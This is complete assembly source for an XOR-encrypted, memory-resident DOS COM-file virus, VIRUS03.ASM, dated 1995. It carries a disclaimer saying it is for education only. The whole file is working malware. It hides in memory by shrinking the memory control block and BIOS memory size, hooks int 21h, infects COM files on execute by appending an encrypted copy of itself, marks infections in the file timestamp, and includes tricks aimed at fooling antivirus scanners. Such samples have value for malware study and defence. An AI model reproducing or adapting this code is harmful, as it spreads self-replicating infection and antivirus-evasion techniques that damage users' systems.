;
;	VIRUS03.ASM
;
;	Author: Johan Gardhage <johan.gardhage@gmail.com>
;	Originally written in 1995.
;
; Description:
; This virus is a resident infector of COM files, encrypted with an
; XOR algorithm. It uses BIOS manipulation to install the int21h handler.
;
; The virus infects on execute (4b00h).
;
; Disclaimer:
; I take no responsibility for any damage, either direct or implied,
; caused by the usage of this virus source code or of the resulting code
; after assembly. The code was written for educational purposes ONLY.
;

	.model	tiny
	.code
	.startup
	locals @@

VirusSize	equ	EndVirus-BeginVirus
SegmentSize	equ	(EndVirus-BeginVirus+1023)/1024
TimeStamp	equ	10001b				; Stealth marker
VirusInterrupt	equ	7979h
VirusIdentifier	equ	'bA'

;---------------------------------------------------------------------
;	The virus begins here
;---------------------------------------------------------------------

BeginVirus:
	push	ax
	pop	ax
	push	ax
	pop	ax

	call	@@delta
@@delta:
	pop	bp					; bp holds current location
	sub	bp, offset @@delta			; calculate delta offset
	lea	si,[bp+offset @@quit]
	mov	word ptr ds:[si],20cdh
@@quit:	mov	word ptr ds:[si],04c7h
	call	EncryptDecrypt

;---------------------------------------------------------------------
;	Start of encrypted area
;---------------------------------------------------------------------

BeginEncryptedSection:
	mov	ax,VirusInterrupt			; Check if in mem
	int	21h
	cmp	ax,VirusIdentifier
	je	AlreadyResident

	mov	ax, es					; Get PSP
	dec	ax
	mov	ds, ax					; Get MCB

	sub	word ptr ds:[3],SegmentSize*64		; Change...
	sub	word ptr ds:[12h],SegmentSize*64	; ...allocation
	mov	es,word ptr ds:[12h]			; Calc usable segment

	push	cs
	pop	ds

	lea	si,[bp+offset BeginVirus]		; Source
	xor	di,di					; Destination
	mov	cx,VirusSize/2+1			; Bytes to copy
	rep	movsw					; Move it!

	xor	ax,ax
	mov	ds,ax
	sub	word ptr ds:[413h],SegmentSize		; Shrink memory size
	lds	bx,ds:[21h*4]				; Get old int handler
	mov	word ptr es:Int21o, bx			; Save old offset
	mov	word ptr es:Int21s, ds			; Save old segment
	mov	ds,ax
	mov	word ptr ds:[21h*4], offset Int21hHandler ; Replace with new
	mov	word ptr ds:[21h*4+2], es		; in high memory

AlreadyResident:
	push	cs					; Make cs=ds=es
	push	cs
	pop	es
	pop	ds

	lea	si,[bp+OrgJmp]
	mov	di,100h
	push	di					; Save di at 100h
	movsw						; Copy first bytes
	movsw
	ret						; Return to 100h

;---------------------------------------------------------------------
;	New int 21h handler
;---------------------------------------------------------------------

Int21hHandler:
	cmp	ax,VirusInterrupt			; Return installation
	jne	@@next
	mov	ax,VirusIdentifier
	iret
@@next:	cmp	ax,4b00h				; Execute?
	je	InfectFileOnExecute

OldInt21h:
	db	0eah
Int21o	dw	?
Int21s	dw	?

;---------------------------------------------------------------------
;	Infect on execute (4b00h)
;---------------------------------------------------------------------

InfectFileOnExecute:
	push	es bp ax bx cx si di ds dx

	mov	ax,3d02h				; Open file
	int	21h
	xchg	ax,bx

	push	cs					; cs=ds
	pop	ds

	mov	ax,5700h				; Get time/date
	int	21h
	mov	Time,cx
	mov	Date,dx

	mov	ah,3fh					; Read first bytes
	mov	cx,4
	mov	dx,offset OrgJmp
	int	21h

	cmp	word ptr OrgJmp,'ZM'			; Check if .EXE file
	je	@@skip					; Don't infect!
	cmp	word ptr OrgJmp,'MZ'
	je	@@skip

	cmp	byte ptr OrgJmp+3,'@'			; Don't reinfect!
	je	@@skip

	mov	ax,4202h				; Go to EOF
	xor	cx,cx					; and return filesize
	xor	dx,dx
	int	21h

	cmp	ax,(0ffffh-VirusSize)			; Dont infect too big
	jae	@@skip
	cmp	ax,VirusSize				; or too small files
	jb	@@skip

	add	ax,offset BeginVirus-3			; Calc entry offset
	mov	word ptr NewJmp[1],ax			; Move it to NewJmp

@@loop:	mov	ah,2ch					; Get encrypt value
	int	21h
	or	dl,dl
	je	@@loop
	mov	Key,dx

	mov	ax,08d00h				; Copy virus to mem
	mov	es,ax
	xor	di,di
	mov	si,di
	mov	cx,(VirusSize+1)/2
	rep	movsw
	push	es
	pop	ds
	xor	bp,bp					; and encrypt it
	call	EncryptDecrypt

	mov	ah,40h					; Write virus to file
	mov	cx,VirusSize
	cwd
	int	21h

	push	cs					; cs=ds
	pop	ds

	mov	ax,4200h				; Go to SOF
	xor	cx,cx
	cwd
	int	21h

	mov	ah,40h					; Write jmp-construct
	mov	cx,4
	mov	dx,offset NewJmp
	int	21h

	mov	ax,5701h				; Restore date/time
	mov	dx,Date
	mov	cx,Time
	and	cl,11100000b				; Zero sec's
	or	cl,TimeStamp				; Mark infected!
	int	21h

@@skip:	mov	ah,3eh					; Close
	int	21h

	pop	dx ds di si cx bx ax bp es

	jmp	OldInt21h

NewJmp	db	0e9h,00h,00h,'@'			; New entry buffer
OrgJmp	db	0cdh,20h,00h,00h			; 4 byte buffer

Time	dw	0
Date	dw	0

EndEncryptedSection:

;---------------------------------------------------------------------
;	End of encrypted section
;---------------------------------------------------------------------

EncryptDecrypt:
	mov	cx,(EndEncryptedSection-BeginEncryptedSection)/2
	lea	si,[bp+BeginEncryptedSection]		; fool TBAV/F-PROT
@@loop:	db	81h,34h
Key	dw	0					; en/decrypt value
	inc	si					; encryption
	inc	si
	loop	@@loop
	ret

EndVirus:

end
